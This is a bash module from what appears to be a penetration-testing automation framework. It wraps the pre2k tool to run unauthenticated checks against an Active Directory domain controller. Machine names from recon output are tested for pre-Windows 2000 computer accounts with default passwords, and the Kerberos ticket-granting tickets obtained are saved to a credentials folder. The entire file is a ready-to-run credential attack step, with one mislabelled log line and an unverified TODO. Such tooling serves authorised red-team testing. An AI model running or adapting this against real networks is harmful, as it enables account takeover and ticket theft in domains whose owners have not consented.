#!/usr/bin/env bash
set -uo pipefail

# =============================================================================
# NAME        : run_pre2k_unauth.sh
# DESCRIPTION :
# AUTHOR      : Adam Compton
# DATE CREATED: 2024-12-09 13:49:51
# =============================================================================
# EDIT HISTORY:
# DATE                 | EDITED BY    | DESCRIPTION OF CHANGE
# ---------------------|--------------|----------------------------------------
# 2024-12-09 13:49:51  | Adam Compton | Initial creation.
# =============================================================================

# Define script categories
script_categories["run_pre2k_unauth"]="internal"

# Define an approximate ordering
script_order["run_pre2k_unauth"]=20

# Main function
function run_pre2k_unauth() {
    # =============================================================================
    # Step 1: Validate environment variables
    # =============================================================================
    local _env_vars
    _env_vars=("AD_DOMAIN" "DC_IP" "RECON_DIR" "TOOLS_DIR" "CREDS_DIR")
    validate_envs "${_env_vars[@]}" || return 1

    # =============================================================================
    # Step 2: Validate input files and output directories
    # =============================================================================
    local _input_files
    local _output_dirs
    _input_files=("${RECON_DIR}/MACHINE_NAME.txt")
    _output_dirs=("${CREDS_DIR}")
    validate_input_output _input_files _output_dirs || return 1

    # =============================================================================
    # Step 3: Validate any needed tools exist
    # =============================================================================
    validate_tools "python3"

    # =============================================================================
    # Step 4: Main logic
    # =============================================================================
    # Define file paths
    DNS_FILE="${RECON_DIR}/MACHINE_NAME.txt"
    PRE2K_OUTPUT="${CREDS_DIR}/pre2k_unauth.txt"

    info "Running Pre2k unauthenticated scan for domain: ${AD_DOMAIN}, DC IP: ${DC_IP}..."
    # Function call arguments
    ARGS=(
        unauth
        -d "${AD_DOMAIN}"
        -dc-ip "${DC_IP}"
        -inputfile "${DNS_FILE}"
        -save
        -verbose
        -outputfile "${PRE2K_OUTPUT}"
    )
    # Check if pre2k.py is a defined function
    if declare -F pre2k.py > /dev/null; then
        info "Using sourced function: pre2k.py"
        pre2k.py "${ARGS[@]}"
    else
        info "pre2k.py function not found â€” falling back to Python script"
        "${TOOLS_DIR}/pre2k-TS/venv/bin/python3" "${TOOLS_DIR}/pre2k-TS/pre2k.py" "${ARGS[@]}"
    fi

    if [[ $? -ne 0 ]]; then
        fail "Pre2k unauthenticated scan failed."
        return
    fi

    info "Pre1k scan completed. Output saved to ${PRE2K_OUTPUT}."

    # Save any TGT (Ticket-Granting Tickets) found
    info "Checking for .ccache files to save TGTs..."
    #
    # TODO: verify that the ccache files end up where expected
    #
    for ccache_file in ./*.ccache; do
        if [[ -f "${ccache_file}" ]]; then
            "saveTGT" "${ccache_file}"
        fi
    done

    pass "Pre2k unauthenticated scan completed successfully."
}
